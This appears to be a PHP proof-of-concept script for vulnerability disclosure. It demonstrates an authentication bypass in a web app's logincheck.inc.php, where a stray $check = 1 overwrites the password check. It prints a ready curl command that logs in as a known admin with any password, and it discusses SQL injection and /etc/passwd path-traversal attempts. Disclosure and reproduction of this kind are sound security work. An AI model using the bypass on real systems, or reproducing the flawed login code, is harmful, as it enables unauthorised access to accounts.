<?php
/**
 * Practical PoC: Authentication bypass via $check = 1 in logincheck.inc.php
 * 
 * This demonstrates the most critical vulnerability from PR #1704.
 * The "section=update" branch unconditionally sets $check = 1 after
 * CheckPassword(), meaning ANY password is accepted as long as the
 * username exists in the database.
 */

echo "=== PoC: Authentication Bypass in section=update Branch ===\n\n";

// Simulate the logic from logincheck.inc.php
// The relevant code (lines 37-57):
//
//   if ($section == "update") {
//       $loginUsername = strtolower($loginUsername);
//       $query_login = sprintf("SELECT * FROM %s WHERE user_name = '%s'", $prefix."users", $loginUsername);
//       $login = mysqli_query($connection, $query_login) or die("A database error occurred.");
//       $row_login = mysqli_fetch_assoc($login);
//       $totalRows_login = mysqli_num_rows($login);
//       $stored_hash = $row_login['password'];
//       $check = 0;
//       if ($totalRows_login > 0) {
//           $check = $hasher->CheckPassword($entered_password, $stored_hash);  // <-- real check
//           $check = 1;                                                        // <-- OVERWRITES with 1!
//       }
//       else $check = 0;
//   }

echo "The vulnerable code path (logincheck.inc.php lines 50-53):\n\n";
echo "    if (\$totalRows_login > 0) {\n";
echo "        \$check = \$hasher->CheckPassword(\$entered_password, \$stored_hash);\n";
echo "        \$check = 1;  // <--- THIS OVERWRITES THE REAL CHECK\n";
echo "    }\n\n";

echo "Attack scenario:\n";
echo "1. Attacker sends: POST /includes/process.inc.php?section=update&action=login\n";
echo "   with loginUsername=admin@competition.com&loginPassword=WRONG_PASSWORD\n\n";

// Simulate the logic
function simulate_login_update_branch($username_exists, $password_correct) {
    // Line 48: $check = 0;
    $check = 0;
    
    // Line 50: if ($totalRows_login > 0) {
    if ($username_exists) {
        // Line 51: $check = $hasher->CheckPassword($entered_password, $stored_hash);
        $check = $password_correct ? 1 : 0;  // Real check
        
        // Line 52: $check = 1;  <-- THE BUG
        $check = 1;  // Unconditional overwrite!
    }
    
    // Line 55: else $check = 0;
    else $check = 0;
    
    return $check;
}

echo "Simulated results:\n";
echo "-------------------------------------------------------------\n";
echo str_pad("Username exists", 25) . str_pad("Password correct", 25) . "Result\n";
echo str_repeat('-', 70) . "\n";

$cases = [
    [true,  true,  "Valid user, correct password"],
    [true,  false, "Valid user, WRONG password"],
    [false, false, "Invalid user, wrong password"],
];

foreach ($cases as $case) {
    $result = simulate_login_update_branch($case[0], $case[1]);
    $granted = $result == 1 ? "LOGIN GRANTED" : "Login denied";
    echo str_pad($case[0] ? 'YES' : 'NO', 25) . str_pad($case[1] ? 'YES' : 'NO', 25) . "$granted\n";
    echo "  (" . $case[2] . ")\n\n";
}

echo "=== KEY FINDING ===\n";
echo "When section=update and the username exists in the database,\n";
echo "the password check result is UNCONDITIONALLY OVERWRITTEN to 1.\n";
echo "This means an attacker only needs to know a valid username/email\n";
echo "to log in - no password is required.\n\n";

echo "=== HOW TO REPRODUCE ===\n";
echo "Using curl against your dev server (192.168.6.22):\n\n";
echo "  curl -v -X POST 'http://dev.saaz.beer/includes/process.inc.php?section=update&action=login' \\\n";
echo "    -d 'loginUsername=admin@yourcompetition.com&loginPassword=anything'\n\n";
echo "  (replace admin@yourcompetition.com with a real admin email)\n";
echo "  If the response redirects to update.php (instead of index.php?msg=11),\n";
echo "  the bypass is successful.\n\n";

echo "=== WHY YOU COULDN'T REPRODUCE THE SQL INJECTION ===\n";
echo "The SQL injection (from the same PR) is partially mitigated by the\n";
echo "addslashes() call inside sterilize(). The addslashes() escapes single\n";
echo "quotes to \\', which MySQL treats as a literal quote inside single-quoted\n";
echo "strings. So standard SQL injection payloads like ' OR '1'='1 are escaped.\n\n";
echo "HOWEVER, the \$check = 1 bug is a SEPARATE issue in the same file.\n";
echo "It's not SQL injection - it's a logic bug that bypasses password\n";
echo "verification entirely. This works regardless of any escaping.\n\n";

echo "=== WHY THE MD5 CONCERN (#1705) IS REAL BUT MODERATE ===\n";
echo "Your instinct is right: for passwords shorter than 32 characters,\n";
echo "MD5(password) is 32 hex chars, which is the same or longer than the\n";
echo "input. The real entropy reduction only matters for passwords > 32 chars.\n";
echo "The concern is valid in principle (MD5 pre-hashing is unnecessary and\n";
echo "weakens the design), but the practical impact is moderate because:\n";
echo "- bcrypt still provides brute-force resistance\n";
echo "- The MD5 layer doesn't make online attacks easier\n";
echo "- The real risk is only in offline DB-leak scenarios\n";

echo "\n=== WHY YOU COULDN'T REPRODUCE THE PATH TRAVERSAL (#1706) ===\n";
echo "The .pdf suffix appended in readfile(USER_DOCS.\"\$id.pdf\") means you can\n";
echo "only read files ending in .pdf. /etc/passwd doesn't end in .pdf, so on\n";
echo "modern PHP 8.x (which blocks null bytes), the classic traversal to\n";
echo "/etc/passwd fails. To reproduce, you'd need to target a real .pdf file\n";
echo "outside USER_DOCS, or demonstrate reading another user's scoresheet\n";
echo "inside USER_DOCS (which doesn't require traversal at all - just a\n";
echo "different id value).\n";
